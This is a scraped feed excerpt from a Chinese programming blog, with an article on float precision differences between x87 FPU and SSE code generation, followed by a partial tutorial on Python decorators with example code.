很简单吧，马上笔算下结果为-202014162，没问题，难道C#没有产生这样的结果？不可能吧，开启Visual Studio，copy代码试试，果然结果是-202014162。就这样完了么？显然没有！你把编译时的选项从AnyCPU改成x64试试~(服务器环境正是64位滴哦！！)结果居然边成了-202014160，对没错，就是-202014160。有点不相信，再跑两遍，仍然是-202014160。呃，想通了，因为浮点运算的误差，-202014160这个结果是合理的。

为什么合理呢？很正常，因为上面的p3x和p2y是两个float类型，虽然v321是double，但也是两个float类型计算完后再转成double的，&lt;strong&gt;float的精度本来也只有7位，所以，对于这个上亿的数，自然没有办法保证精度&lt;/strong&gt;。

&lt;strong&gt;但是为什么修改CPU的type会有不同的效果？&lt;/strong&gt;嗯，我们再试试C/C++。

&lt;span id="more-11235"&gt;&lt;/span&gt;

[c]#include
using namespace std;

int main()
{
    float p3x = 80838.0f;
    float p2y = -2499.0f;
    double v321 = p3x * p2y;
    std::cout.precision(15);
    std::cout &lt;&lt; v321 &lt;&lt; std::endl;

    return 0;
}
</pre>
<p>上面这段C++代码在不同的平台下的结果如下：</p>
<ul>
<li>Windows 32/64位下：-202014160</li>
<li>Linux 64位下（CentOS 6 gcc 4.4.7）-202014160，</li>
<li>Linux 32位下（Ubuntu 12.04+ gcc 4.6.3）是：-202014162</li>
</ul>
<p><strong>合理的结果应该是-202014160，正确的运算结果是-202014162</strong>，合理性是浮点精度不够造成的（文后解释了合理性）。若是用两个double相乘可得正确且合理的运算结果（注：把上面C++的程序中的p3x和p2y的类型声明成double，就能得到正确的结果，因为double是双精度的，float是单精度，所以double有足够的位数存放更多的数位）。<strong>但是我们有点不明白，为什么Linux 32位下，居然能算出“正确”的数，而不是“合理”的数</strong>。</p>
<p>与C++一样，C#在32位和64位（DEBUG下，这个后面会说）下没有得到一致的结果，那我们来看一下C++/C#的汇编代码（使用gdb的disassemble /m main 命令，另外下面只显示 float * float 然后转成double的那一行代码的汇编）</p>
<p><strong>Linux平台下用G++编译</strong></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//C++ 32位系统下 Ubuntu 12.04
8	    double v321 = p3x * p2y;
   0x0804860f &lt;+27&gt;:	flds   0x18(%esp)
   0x08048613 &lt;+31&gt;:	fmuls  0x1c(%esp)
   0x08048617 &lt;+35&gt;:	fstpl  0x10(%esp)

.......</pre>
<br>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//C++ 64位系统下 CentOS 6
9           double v321 = p3x * p2y;
   0x000000000040083c &lt;+24&gt;:    movss  -0x20(%rbp),%xmm0
   0x0000000000400841 &lt;+29&gt;:    mulss  -0x1c(%rbp),%xmm0
   0x0000000000400846 &lt;+34&gt;:    unpcklps %xmm0,%xmm0
   0x0000000000400849 &lt;+37&gt;:    cvtps2pd %xmm0,%xmm0
   0x000000000040084c &lt;+40&gt;:    movsd  %xmm0,-0x18(%rbp)</pre>
<p><strong>Windows平台下用Visual Studio编译</strong></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//C# AnyCPU编译，Windows VS2012
double v321 = p3x * p2y;
00000049  fld         dword ptr [ebp-40h]
0000004c  fmul        dword ptr [ebp-44h]
0000004f  fstp        qword ptr [ebp-4Ch]</pre>
<br>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//C# X64位编译 Windows7 VS2012
double v321 = p3x * p2y;&lt;/pre&gt;
009B43B8 movss xmm0,dword ptr [p3x]
009B43BD mulss xmm0,dword ptr [p2y]
009B43C2 cvtss2sd xmm0,xmm0
009B43C6 movsd mmword ptr [v321],xmm0</pre>
<p>从上面的汇编代码可以看出，无论是Linux和Windows，C++或C# 32位和64对浮点数的汇编指令并不一样。 32位生成代码用的指令是fld/fmul/fstp等，而64位下的使用了movss/mulss/movsd/的指令。看下来，似乎这个事情和平台有关系。</p>
<p>我们继续调查，我们发现，其中fld/fmul/fstp等指令是由<strong>FPU</strong>(float point unit)浮点运算处理器做的，准确的说，是FPU x87指令，FPU在进行浮点运算时，用了<strong>80位</strong>的寄存器做相关浮点运算，然后再根据是float/double截取成32位或64位，FPU默认上会尽量减少由于需要四舍五入带来的精度问题。可参看浮点运算标准<a href="https://en.wikipedia.org/wiki/IEEE_floating_point" target="_blank">IEEE-754</a> 推荐标准实现者提供浮点可扩展精度格式(<a href="https://en.wikipedia.org/wiki/Extended_precision" target="_blank">Extended precision</a>)，Intel x86处理器有FPU(float point unit)浮点运算处理器支持这种扩展。</p>
<p>非FPU的情况是用了SSE中128位寄存器(float实际只用了其中的32位，计算时也是以32位计算的)，这就是导致上述问题产生的最终原因。详细分析见文末说明。</p>
<p>知道了这一点，我们可以man g++ 看一下文档，我们可以找到一个编译选项叫：<strong>-mfpmath，在32位下，这个编译选项的默认值是：387，也就是x87 FPU指令，在64位下，这个编译选项的值是sse，也就是使用SSE的指令</strong>。所以，就这篇文章中的这个例子而言，如果你在64bits下加上如 -mfpmath=387，你会得到“正确的”结果，而不是“合理的”结果。</p>
<p>而在VS2012中C++，<a href="https://msdn.microsoft.com/zh-cn/library/vstudio/e7s85ffb(v=vs.110).aspx" target="_blank">编译选项可以设置(代码生成中)</a>可选，/fp:[precise | fast | strict]，本例中Release 32位下用precise 或者 strict将得到合理的结果(-202014160)，fast将产生正确的结果(-202014162), fast debug/release下结果也不一样哦(release下才优化了)。64系统下各个结果可以大家自己去测试下(Debug/Release)，分别看看VS编译后产生的中间代码长什么样。（陈皓注：我的VS2012在debug编译下，无论你怎么设置/fp的参数值，汇编都是一样的，使用SSE指令，而Release就不一样了，但是我的release下看代码的汇编非常怪异和源代码对上号，多年不用Windows开发了，对VS的使用仅停留在VC6++/VC2005上）</p>
<p>所以，我们在从x87 FPU指令向SSE指令做代码移植的时候，我们可能会遇到向这样的浮点数的精度问题，这个精度问题会多次科学计算中会更糟糕。<strong>这个问题并不简单的只是在32位和64位中的系统出算，这个问题主要还是看语言编译器的实现</strong>。在更为高级的语言中，如：C99或Fortran 2003中，引入了“long double”来做可扩展双精度（Extension Double），这样就可以消除更多的精度问题。</p>
<p>下面我们把程序改成long double，（注：其中的类型变成long double）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include
using namespace std;

int main()
{
    long double p3x = 80838.0;
    long double p2y = -2499.0;
    long double v321 = p3x * p2y;
    std::cout.precision(15);
    std::cout &lt;&lt; v321 &lt;&lt; std::endl;

    return 0;
}</pre>
<p>用gdb的disassemble /m main你会看到其中的运算的汇编如下（使用了fmlp指令）：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//linux 32位系统
8	    long double v321 = p3x * p2y;
   0x08048633 &lt;+63&gt;:	fldt   0x10(%esp)
   0x08048637 &lt;+67&gt;:	fldt   0x20(%esp)
   0x0804863b &lt;+71&gt;:	fmulp  %st,%st(1)
   0x0804863d &lt;+73&gt;:	fstpt  0x30(%esp)
</pre>
<br>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//linux 64位系统
8           long double v321 = p3x * p2y;
   0x0000000000400818 &lt;+52&gt;:    fldt   -0x30(%rbp)
   0x000000000040081b &lt;+55&gt;:    fldt   -0x20(%rbp)
   0x000000000040081e &lt;+58&gt;:    fmulp  %st,%st(1)
   0x0000000000400820 &lt;+60&gt;:    fstpt  -0x10(%rbp)
</pre>
<p><span style="line-height: 1.5em;">我们可以看到，32位系统和64位系统使用了同样的汇编指令（当然，我没有那么多物理机，我只是在VMWare Play的虚拟机上测试的，所以上面的示例并不一定适用于所有的地方，另外，C/C++语言和编译器和平台有非常大的关系） ，原因自然是我们用到了long double这个扩展双精度的数据类型。（注：如果你用double或float，在Linux上，32位用x87 FPU 指令编译，而64位用SSE指令编译）</span></p>
<p>好了，我们再回到C#上来，<span style="line-height: 1.5em;">C#的浮点是支持该标准的，其中</span><a style="line-height: 1.5em;" href="https://msdn.microsoft.com/en-us/library/aa691146(v=vs.71).aspx">其官方文档</a><span style="line-height: 1.5em;">也提到了浮点运算可能会产生比返回类型更高精度的值（正如上面的返回值精度就超过了float的精度），并说明如果硬件支持可扩展浮点精度的话，那么</span><strong style="line-height: 1.5em;">所有的</strong><span style="line-height: 1.5em;">浮点运算都将用此精度进行以提高效率，举个例子x*y/z, x*y的值可能都在double的能力范围之外了，但真实情况可能除以z后又能把结果拉回到double范围内，这样的话，用了FPU的结果就会得到一个准确的double值，而非FPU的就是无穷大之类的了。</span></p>
<p><span style="line-height: 1.5em;">所以，对于</span>C#来说，你显然无法找到一个像C/C++一样的利用编译器选项的来解决这个问题的“解决方案”（其实，用编译器参数是一个伪解决方案）<span style="line-height: 1.5em;">。</span></p>
<p><span style="line-height: 1.5em;"><strong>而且，要解决这个问题也不是要修改编译器选项，因为这个问题明显不是FPU或是SSE的问题，FPU是个过时的技术，SSE才是合理的技术，所以，<span style="color: #cc0000;">如果你不想你的浮点数在计算上有什么问题，而且你需要精度准确，正确的解决方案不是搞编译参数，而是——你一定要使用精度更高字节数更多的数据类型，比如：double 或是long double</span>。</strong></span></p>
<p>另外，大家在写代码的时候得保证实际运行环境/测试环境/开发环境的<strong>一致性(包括OS架构啊、编译选项等)</strong>啊（<strong>尤其是C/C++ 而且，编译器上的参数可能会有很多坑，而且有些坑可能会掩盖你程序中的问题</strong>），不然莫名其妙的问题会产生（本文就是开发环境与运行环境不一致导致的问题，纠结了好久才发现是这个原因）；遇到涉及浮点运算的时候别忘了有可能是这个原因产生的；<strong>float/double混用的情况得特别注意</strong>。</p>
<p><strong>Reference：</strong></p>
<p>[1] <a href="https://msdn.microsoft.com/en-us/library/aa691146(v=vs.71).aspx">C# Language Specification Floating point types</a><br>
[2] <a href="https://stackoverflow.com/questions/6683059/are-floating-point-numbers-consistent-in-c-can-they-be">Are floating-point numbers consistent in C#? Can they be? </a><br>
[3] <a href="http://www.plantation-productions.com/Webster/www.artofasm.com/Linux/HTML/RealArithmetica2.html">The FPU Instruction Set</a></p>
<h4><strong>附录</strong></h4>
<h5><strong>80838.0f * -2499.0f = -202014160.0浮点运算过程的说明</strong></h5>
<p>32位浮点数在计算机中的表示方式为：1位符号位(s)-8位指数位(E)-23位有效数字(M)。<br>
32位Float = (-1)^s * (1+m) * 2^(e-127), 其中e是实际转换成1.xxxxx*2^e的指数,m是前面的xxxxx(节约1位)</p>
<p>80838.0f = 1 0011 1011 1100 0110.0= 1.00111011110001100*2^16<br>
有效位M = 0011 1011 1100 0110 0000 000<br>
指数位E = 16 + 127 = 143 =  10001111<br>
内部表示 80838.0 =  0 [1000 1111] [0011 1011 1100 0110 0000 000]<br>
= 0100 0111 1001 1101 1110 0011 0000 0000<br>
= 47 9d e3 00 //实际调试时看到的内存值 可能是00 e3 9d 47是因为调试环境用了小端表示法法：低位字节排内存低地址端，高位排内存高地址</p>
<p>-2499.0 = -100111000011.0 = -1.001110000110 * 2^11<br>
有效位M = 0011 1000 0110 0000 0000 000<br>
指数位E = 11+127=138= 10001010<br>
符号位s = 1<br>
内部表示-2499.0 = 1 [10001010] [0011 1000 0110 0000 0000 000]<br>
=1100 0101 0001 1100 0011 0000 0000 0000<br>
=c5 1c 30 00</p>
<p>80838.0 * -2499.0 = ?</p>
<p>首先是指数 e = 11+16 = 27<br>
指数位E = e + 127 = 154 = 10011010<br>
有效位相乘结果为 1.1000 0001 0100 1111 1011 1010 01 //可以自己动手实际算下<br>
实际中只能有23位，后面的被截断即1000 0001 0100 1111 1011 101<span style="text-decoration: line-through;">0 01 </span><br>
相乘结果内部表示=1[10011010][1000 0001 0100 1111 1011 101]<br>
= 1100 1101 0100 0000 1010 0111 1101 1101<br>
= cd 40 a7 dd</p>
<p>结果 =  -1.1000 0001 0100 1111 1011 101 *2^27<br>
=  -11000 0001 0100 1111 1011 1010000<br>
=  -202014160<br>
再转成double后还是-202014160.</p>
<p>如果是FPU的话，上面的有效位结果不会被截断，即<br>
FPU结果 = -1.1000 0001 0100 1111 1011 101<strong>001</strong> *2^27<br>
= -11000 0001 0100 1111 1011 101<strong>001</strong>0<br>
= -202014162</p>
<p>全文完，若本文有纰漏之处欢迎指正。</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-03-15T20:44:24+08:00</pubDate>
<guid>https://coolshell.cn/articles/11235.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Python修饰器的函数式编程 ]]></title>
<link>https://coolshell.cn/articles/11265.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >Python的修饰器的英文名叫Decorator，当你看到这个英文名的时候，你可能会把其跟Design Pattern里的Decorator搞混了，其实这是完全不同的两个东西。虽然好像，他们要干的事都很相似——都是想要对一个已有的模块做一些“修饰工作”，所谓修饰工作就是想给现有的模块加上一些小装饰（一些小功能，这些小功能可能好多模块都会用到），但又不让这个小装饰（小功能）侵入到原有的模块中的代码里去。但是OO的Decorator简直就是一场恶梦，不信你就去看看wikipedia上的词条（<a href="https://en.wikipedia.org/wiki/Decorator_pattern" target="_blank" rel="noopener noreferrer">Decorator Pattern</a>）里的UML图和那些代码，这就是我在《 <a title="链接：从面向对象的设计模式看软件设计" href="https://coolshell.cn/articles/8961.html" rel="bookmark">从面向对象的设计模式看软件设计</a>》“餐后甜点”一节中说的，OO鼓励了——“厚重地胶合和复杂层次”，也是《 <a title="链接：如此理解面向对象编程" href="https://coolshell.cn/articles/8745.html" rel="bookmark">如此理解面向对象编程</a>》中所说的“OO的狂热者们非常害怕处理数据”，Decorator Pattern搞出来的代码简直就是OO的反面教程。</p>
<p>Python 的 Decorator在使用上和Java/C#的Annotation很相似，就是在方法名前面加一个@XXX注解来为这个方法装饰一些东西。但是，Java/C#的Annotation也很让人望而却步，太TMD的复杂了，你要玩它，你需要了解一堆Annotation的类库文档，让人感觉就是在学另外一门语言。</p>
<p>而Python使用了一种相对于Decorator Pattern和Annotation来说非常优雅的方法，这种方法不需要你去掌握什么复杂的OO模型或是Annotation的各种类库规定，完全就是语言层面的玩法：一种函数式编程的技巧。如果你看过本站的《<a href="https://coolshell.cn/articles/10822.html">函数式编程</a>》，你一定会为函数式编程的那种“描述你想干什么，而不是描述你要怎么去实现”的编程方式感到畅快。（如果你不了解函数式编程，那在读本文之前，还请你移步去看看《<a href="https://coolshell.cn/articles/10822.html">函数式编程</a>》） 好了，我们先来点感性认识，看一个Python修饰器的Hello World的代码。</p>
<p><span id="more-11265"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Hello_World" title="Hello World">Hello World</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Decorator_%E7%9A%84%E6%9C%AC%E8%B4%A8" title="Decorator 的本质">Decorator 的本质</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%B8%A6%E5%8F%82%E6%95%B0%E5%8F%8A%E5%A4%9A%E4%B8%AADecrorator" title="带参数及多个Decrorator">带参数及多个Decrorator</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#class%E5%BC%8F%E7%9A%84_Decorator" title="class式的 Decorator">class式的 Decorator</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%94%A8Decorator%E8%AE%BE%E7%BD%AE%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%8F%82%E6%95%B0" title="用Decorator设置函数的调用参数">用Decorator设置函数的调用参数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Decorator%E7%9A%84%E5%89%AF%E4%BD%9C%E7%94%A8" title="Decorator的副作用">Decorator的副作用</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-7" href="#%E4%B8%80%E4%BA%9Bdecorator%E7%9A%84%E7%A4%BA%E4%BE%8B" title="一些decorator的示例">一些decorator的示例</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#%E7%BB%99%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%81%9A%E7%BC%93%E5%AD%98" title="给函数调用做缓存">给函数调用做缓存</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#Profiler%E7%9A%84%E4%BE%8B%E5%AD%90" title="Profiler的例子">Profiler的例子</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#%E6%B3%A8%E5%86%8C%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0" title="注册回调函数">注册回调函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#%E7%BB%99%E5%87%BD%E6%95%B0%E6%89%93%E6%97%A5%E5%BF%97" title="给函数打日志">给函数打日志</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#%E4%B8%80%E4%B8%AAMySQL%E7%9A%84Decorator" title="一个MySQL的Decorator">一个MySQL的Decorator</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#%E7%BA%BF%E7%A8%8B%E5%BC%82%E6%AD%A5" title="线程异步">线程异步</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Hello_World"></span>Hello World<span class="ez-toc-section-end"></span>
</h4>
<p>下面是代码（文件名：hello.py）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="1-6,8">def hello(fn):
    def wrapper():
        print "hello, %s" % fn.__name__
        fn()
        print "goodby, %s" % fn.__name__
    return wrapper

@hello
def foo():
    print "i am foo"

foo()
</pre>
<p>当你运行代码，你会看到如下输出：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="beddd6dbd0dfd6d1feddd6dbd0d6dfd193dfd7cc">[email protected]</a>]$ python hello.py
hello, foo
i am foo
goodby, foo</pre>
<p>你可以看到如下的东西：</p>
<p style="padding-left: 30px;">1）函数foo前面有个@hello的“注解”，hello就是我们前面定义的函数hello</p>
<p style="padding-left: 30px;">2）在hello函数中，其需要一个fn的参数（这就用来做回调的函数）</p>
<p style="padding-left: 30px;">3）hello函数中返回了一个inner函数wrapper，这个wrapper函数回调了传进来的fn，并在回调前后加了两条语句。</p>
<h4>
<span class="ez-toc-section" id="Decorator_%E7%9A%84%E6%9C%AC%E8%B4%A8"></span>Decorator 的本质<span class="ez-toc-section-end"></span>
</h4>
<p>对于Python的这个@注解语法糖- Syntactic Sugar 来说，当你在用某个@decorator来修饰某个函数func时，如下所示:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">@decorator
def func():
    pass
</pre>
<p>其解释器会解释成下面这样的语句：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">func = decorator(func)</pre>
<p>尼玛，这不就是把一个函数当参数传到另一个函数中，然后再回调吗？是的，但是，我们需要注意，那里还有一个赋值语句，把decorator这个函数的返回值赋值回了原来的func。 根据《<a href="https://coolshell.cn/articles/10822.html" target="_blank" rel="noopener noreferrer">函数式编程</a>》中的<strong>first class functions</strong>中的定义的，你可以把函数当成变量来使用，所以，decorator必需得返回了一个函数出来给func，这就是所谓的<strong>higher order function </strong>高阶函数，不然，后面当func()调用的时候就会出错。 就我们上面那个hello.py里的例子来说，</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">@hello
def foo():
    print "i am foo"
</pre>
<p>被解释成了：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python"> foo = hello(foo)</pre>
<p><strong>是的，这是一条语句，而且还被执行了。</strong>你如果不信的话，你可以写这样的程序来试试看：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def fuck(fn):
    print "fuck %s!" % fn.__name__[::-1].upper()

@fuck
def wfg():
    pass
</pre>
<p>没了，就上面这段代码，没有调用wfg()的语句，你会发现， fuck函数被调用了，而且还很NB地输出了我们每个人的心声！</p>
<p>再回到我们hello.py的那个例子，我们可以看到，<strong>hello(foo)返回了wrapper()函数，所以，foo其实变成了wrapper的一个变量，而后面的foo()执行其实变成了wrapper()</strong>。</p>
<p>知道这点本质，当你看到有多个decorator或是带参数的decorator，你也就不会害怕了。</p>
<p>比如：多个decorator</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">@decorator_one
@decorator_two
def func():
    pass</pre>
<p>相当于：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">func = decorator_one(decorator_two(func))</pre>
<p>比如：带参数的decorator：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">@decorator(arg1, arg2)
def func():
    pass</pre>
<p>相当于：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">func = decorator(arg1,arg2)(func)</pre>
<p>这意味着decorator(arg1, arg2)这个函数需要返回一个“真正的decorator”。</p>
<h4>
<span class="ez-toc-section" id="%E5%B8%A6%E5%8F%82%E6%95%B0%E5%8F%8A%E5%A4%9A%E4%B8%AADecrorator"></span>带参数及多个Decrorator<span class="ez-toc-section-end"></span>
</h4>
<p>我们来看一个有点意义的例子（文件名：html.py）：</p>
<p>在上面这个例子中，我们可以看到：makeHtmlTag有两个参数。所以，<strong>为了让 <span style="color: #000080;">hello = makeHtmlTag(arg1, arg2)(hello)</span> 成功，makeHtmlTag 必需返回一个decorator</strong>（这就是为什么我们在makeHtmlTag中加入了real_decorator()的原因）<strong>，这样一来，我们就可以进入到 decorator 的逻辑中去了</strong>—— decorator得返回一个wrapper，wrapper里回调hello。<strong>看似那个makeHtmlTag() 写得层层叠叠，但是，已经了解了本质的我们觉得写得很自然</strong>。 你看，Python的Decorator就是这么简单，没有什么复杂的东西，你也不需要了解过多的东西，使用起来就是那么自然、体贴、干爽、透气，独有的速效凹道和完美的吸收轨迹，让你再也不用为每个月的那几天感到焦虑和不安，再加上贴心的护翼设计，量多也不用当心。对不起，我调皮了。 什么，你觉得上面那个带参数的Decorator的函数嵌套太多了，你受不了。好吧，没事，我们看看下面的方法。</p>
<h4>
<span class="ez-toc-section" id="class%E5%BC%8F%E7%9A%84_Decorator"></span>class式的 Decorator<span class="ez-toc-section-end"></span>
</h4>
<p>首先，先得说一下，decorator的class方式，还是看个示例：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-highlight="3,7">class myDecorator(object):

    def __init__(self, fn):
        print "inside myDecorator.__init__()"
        self.fn = fn

    def __call__(self):
        self.fn()
        print "inside myDecorator.__call__()"

@myDecorator
def aFunction():
    print "inside aFunction()"

print "Finished decorating aFunction()"

aFunction()

# 输出：
# inside myDecorator.__init__()
# Finished decorating aFunction()
# inside aFunction()
# inside myDecorator.__call__()</pre>
<p>上面这个示例展示了，用类的方式声明一个decorator。我们可以看到这个类中有两个成员：<br>
1）一个是<strong>init</strong>()，这个方法是在我们给某个函数decorator时被调用，所以，需要有一个fn的参数，也就是被decorator的函数。<br>
2）一个是<strong>call</strong>()，这个方法是在我们调用被decorator函数时被调用的。<br>
上面输出可以看到整个程序的执行顺序。</p>
<p>这看上去要比“函数式”的方式更易读一些。</p>
<p>下面，我们来看看用类的方式来重写上面的html.py的代码（文件名：html.py）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">class makeHtmlTagClass(object):

    def __init__(self, tag, css_class=""):
        self._tag = tag
        self._css_class = " class='{0}'".format(css_class) \
                                       if css_class !="" else ""

    def __call__(self, fn):
        def wrapped(*args, **kwargs):
            return "&lt;" + self._tag + self._css_class+"&gt;"  \
                       + fn(*args, **kwargs) + "&lt;/" + self._tag + "&gt;"
        return wrapped

@makeHtmlTagClass(tag="b", css_class="bold_css")
@makeHtmlTagClass(tag="i", css_class="italic_css")
def hello(name):
    return "Hello, {}".format(name)

print hello("Hao Chen")
</pre>
<p>上面这段代码中，我们需要注意这几点：<br>
1）如果decorator有参数的话，<strong>init</strong>() 成员就不能传入fn了，而fn是在<strong>call</strong>的时候传入的。<br>
2）这段代码还展示了 wrapped(*args, **kwargs) 这种方式来传递被decorator函数的参数。（其中：args是一个参数列表，kwargs是参数dict，具体的细节，请参考Python的文档或是<a href="https://stackoverflow.com/questions/3394835/args-and-kwargs" target="_blank" rel="noopener noreferrer">StackOverflow的这个问题</a>，这里就不展开了）</p>
<h4>
<span class="ez-toc-section" id="%E7%94%A8Decorator%E8%AE%BE%E7%BD%AE%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%8F%82%E6%95%B0"></span>用Decorator设置函数的调用参数<span class="ez-toc-section-end"></span>
</h4>
<p>你有三种方法可以干这个事：</p>
<p>第一种，通过 **kwargs，这种方法decorator会在kwargs中注入参数。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def decorate_A(function):
    def wrap_function(*args, **kwargs):
        kwargs['str'] = 'Hello!'
        return function(*args, **kwargs)
    return wrap_function

@decorate_A
def print_message_A(*args, **kwargs):
    print(kwargs['str'])

print_message_A()</pre>
<p>第二种，约定好参数，直接修改参数</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def decorate_B(function):
    def wrap_function(*args, **kwargs):
        str = 'Hello!'
        return function(str, *args, **kwargs)
    return wrap_function

@decorate_B
def print_message_B(str, *args, **kwargs):
    print(str)

print_message_B()</pre>
<p>第三种，通过 *args 注入</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def decorate_C(function):
    def wrap_function(*args, **kwargs):
        str = 'Hello!'
        #args.insert(1, str)
        args = args +(str,)
        return function(*args, **kwargs)
    return wrap_function

class Printer:
    @decorate_C
    def print_message(self, str, *args, **kwargs):
        print(str)

p = Printer()
p.print_message()</pre>
<h4>
<span class="ez-toc-section" id="Decorator%E7%9A%84%E5%89%AF%E4%BD%9C%E7%94%A8"></span>Decorator的副作用<span class="ez-toc-section-end"></span>
</h4>
<p>到这里，我相信你应该了解了整个Python的decorator的原理了。</p>
<p>相信你也会发现，被decorator的函数其实已经是另外一个函数了，对于最前面那个hello.py的例子来说，如果你查询一下foo.<strong>name</strong>的话，你会发现其输出的是“wrapper”，而不是我们期望的“foo”，这会给我们的程序埋一些坑。所以，Python的functool包中提供了一个叫wrap的decorator来消除这样的副作用。下面是我们新版本的 hello.py。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-highlight="1,3">from functools import wraps
def hello(fn):
    @wraps(fn)
    def wrapper():
        print "hello, %s" % fn.__name__
        fn()
        print "goodby, %s" % fn.__name__
    return wrapper

@hello
def foo():
    '''foo help doc'''
    print "i am foo"
    pass

foo()
print foo.__name__ #输出 foo
print foo.__doc__  #输出 foo help doc
</pre>
<p>当然，即使是你用了functools的wraps，也不能完全消除这样的副作用。</p>
<p>来看下面这个示例：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">from inspect import getmembers, getargspec
from functools import wraps

def wraps_decorator(f):
    @wraps(f)
    def wraps_wrapper(*args, **kwargs):
        return f(*args, **kwargs)
    return wraps_wrapper

class SomeClass(object):
    @wraps_decorator
    def method(self, x, y):
        pass

obj = SomeClass()
for name, func in getmembers(obj, predicate=inspect.ismethod):
    print "Member Name: %s" % name
    print "Func Name: %s" % func.func_name
    print "Args: %s" % getargspec(func)[0]

# 输出：
# Member Name: method
# Func Name: method
# Args: []</pre>
<p>你会发现，即使是你你用了functools的wraps，你在用getargspec时，参数也不见了。</p>
<p>要修正这一问，我们还得用Python的反射来解决，下面是相关的代码：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def get_true_argspec(method):
    argspec = inspect.getargspec(method)
    args = argspec[0]
    if args and args[0] == 'self':
        return argspec
    if hasattr(method, '__func__'):
        method = method.__func__
    if not hasattr(method, 'func_closure') or method.func_closure is None:
        raise Exception("No closure for method.")

    method = method.func_closure[0].cell_contents
    return get_true_argspec(method)</pre>
<p>当然，我相信大多数人的程序都不会去getargspec。所以，用functools的wraps应该够用了。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E4%BA%9Bdecorator%E7%9A%84%E7%A4%BA%E4%BE%8B"></span>一些decorator的示例<span class="ez-toc-section-end"></span>
</h4>
<p>好了，现在我们来看一下各种decorator的例子：</p>
<h5>
<span class="ez-toc-section" id="%E7%BB%99%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%81%9A%E7%BC%93%E5%AD%98"></span>给函数调用做缓存<span class="ez-toc-section-end"></span>
</h5>
<p>这个例实在是太经典了，整个网上都用这个例子做decorator的经典范例，因为太经典了，所以，我这篇文章也不能免俗。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">from functools import wraps
def memo(fn):
    cache = {}
    miss = object()

    @wraps(fn)
    def wrapper(*args):
        result = cache.get(args, miss)
        if result is miss:
            result = fn(*args)
            cache[args] = result
        return result

    return wrapper

@memo
def fib(n):
    if n &lt; 2:
        return n
    return fib(n - 1) + fib(n - 2)
</pre>
